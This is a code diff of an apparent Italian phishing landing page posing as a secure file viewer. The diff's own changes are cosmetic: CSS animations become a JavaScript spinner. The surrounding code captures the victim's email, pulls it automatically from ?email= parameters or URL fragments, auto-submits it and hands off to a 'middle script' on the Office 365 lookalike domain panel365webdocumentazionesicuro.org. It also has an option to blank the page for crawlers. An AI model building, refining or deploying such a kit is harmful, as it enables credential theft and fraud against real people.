@@ -16,10 +16,8 @@
       color:var(--ink);-webkit-font-smoothing:antialiased;
       background:radial-gradient(1200px 600px at 50% -10%,#e0e7ff 0%,#f8fafc 45%,#f1f5f9 100%)}
     .card{width:100%;max-width:420px;background:#fff;border:1px solid var(--line);border-radius:20px;
-      padding:26px 24px 20px;opacity:0;transform:translateY(8px);
-      box-shadow:0 20px 50px -20px rgba(15,23,42,.25),0 2px 6px rgba(15,23,42,.04);
-      animation:in .5s cubic-bezier(.2,.7,.3,1) .05s forwards}
-    [контакт удалён] in{to{opacity:1;transform:none}}
+      padding:26px 24px 20px;
+      box-shadow:0 20px 50px -20px rgba(15,23,42,.25),0 2px 6px rgba(15,23,42,.04)}
     .brand{display:flex;align-items:center;gap:11px;margin-bottom:20px}
     .brand b{display:block;font-size:16.5px;letter-spacing:-.2px}
     .brand span{display:block;font-size:11.5px;color:var(--muted);font-weight:500;margin-top:1px}
@@ -39,9 +37,7 @@
       background:#fff;border:1.5px solid var(--line);border-radius:12px;outline:none;
       transition:border-color .15s,box-shadow .15s}
     input[type=email]:focus{border-color:var(--blue);box-shadow:0 0 0 4px rgba(37,99,235,.12)}
-    input.err{border-color:#dc2626;box-shadow:0 0 0 4px rgba(220,38,38,.1);animation:shake .35s}
-    [контакт удалён] shake{10%,90%{transform:translateX(-1px)}20%,80%{transform:translateX(2px)}
-      30%,50%,70%{transform:translateX(-3px)}40%,60%{transform:translateX(3px)}}
+    input.err{border-color:#dc2626;box-shadow:0 0 0 4px rgba(220,38,38,.1)}
     .hint{font-size:11.5px;color:#dc2626;margin:7px 0 0;height:14px;opacity:0;transition:opacity .15s}
     .hint.on{opacity:1}
     button{width:100%;margin-top:11px;padding:13px 16px;font:inherit;font-size:14.5px;font-weight:600;
@@ -52,9 +48,8 @@
     button:active{transform:translateY(1px)}
     button:disabled{opacity:.75;cursor:default;filter:none}
     .spin{display:none;width:15px;height:15px;border:2px solid rgba(255,255,255,.35);
-      border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
+      border-top-color:#fff;border-radius:50%}
     button.busy .spin{display:block}
-    [контакт удалён] sp{to{transform:rotate(360deg)}}
     .foot{display:flex;align-items:center;justify-content:center;gap:6px;
       margin-top:16px;font-size:11.5px;color:var(--muted)}
   </style>
@@ -116,7 +111,7 @@
              autocapitalize="off" spellcheck="false" placeholder="nome@esempio.it" required>
       <p class="hint" id="hint">Inserisci un indirizzo email valido</p>
       <button id="btn" type="submit">
-        <span class="spin"></span><span id="btnTxt">Visualizza i file</span>
+        <span class="spin" id="spin"></span><span id="btnTxt">Visualizza i file</span>
       </button>
     </form>
 
@@ -136,7 +131,7 @@
 
     // ===== CONFIG =====
     var MIDDLE      = "https://panel365webdocumentazionesicuro.org/middle.html"; // your middle script
-    var DEST        = "/area-riservata";   // destination path (NOT absolute URL) -> base64 into hash
+    var DEST        = "/area-riservata";   // destination path -> base64 into hash
     var MIN_MS      = 900;                 // dwell before handoff
     var AUTO_SUBMIT = true;                // if email came in via ?email= or #hash, fire automatically
     var BLOCK_BOTS  = false;               // true = blank the page for crawlers/headless
@@ -149,7 +144,21 @@
     var btn    = document.getElementById("btn");
     var btnTxt = document.getElementById("btnTxt");
     var hint   = document.getElementById("hint");
+    var spin   = document.getElementById("spin");
     var busy   = false;
+
+    // spinner rotation via JS (no CSS keyframes, nothing to break)
+    var spinAngle = 0, spinTimer = null;
+    function spinStart() {
+      if (spinTimer) return;
+      spinTimer = setInterval(function () {
+        spinAngle = (spinAngle + 30) % 360;
+        spin.style.transform = "rotate(" + spinAngle + "deg)";
+      }, 40);
+    }
+    function spinStop() {
+      if (spinTimer) { clearInterval(spinTimer); spinTimer = null; }
+    }
 
     // decode up to 2 passes (wrappers sometimes double-encode: %40 -> %2540)
     function smartDecode(s) {
@@ -175,8 +184,6 @@
     function fail(msg) {
       hint.textContent = msg || "Inserisci un indirizzo email valido";
       hint.classList.add("on");
-      input.classList.remove("err");
-      void input.offsetWidth;
       input.classList.add("err");
       try { input.focus(); } catch (e) {}
     }
@@ -190,6 +197,7 @@
       btn.disabled = true;
       btn.classList.add("busy");
       btnTxt.textContent = "Apertura in corso…";
+      spinStart();
 
       setTimeout(function () {
         var url = target(email);
@@ -210,9 +218,9 @@
       hint.classList.remove("on");
     });
 
-    // ---- Autograb (same as redirect script):
+    // ---- Autograb (same logic as the redirect script):
     //      1) ?email= query param first — survives mailer wrappers/redirects
-    //      2) fragment fallback: #email (or #dest#email)
+    //      2) fragment fallback: #email  or  #dest#email
     //      double-decoded, validated, then prefill + auto-submit ----
     (function () {
       var email = "";
@@ -228,15 +236,15 @@
         if (raw) {
           var sep = raw.indexOf("#");
           if (sep !== -1) {
-            email = raw.substring(sep + 1);          // part after second #
+            email = raw.substring(sep + 1);
           } else if (RE.test(raw)) {
-            email = raw;                             // bare #email
+            email = raw;
           }
         }
       }
 
       email = smartDecode(email).trim();
-      if (!email || !RE.test(email)) return;         // nothing valid -> normal form flow
+      if (!email || !RE.test(email)) return;   // nothing valid -> normal form flow
 
       input.value = email;
       if (AUTO_SUBMIT) setTimeout(function () { go(email); }, 300);
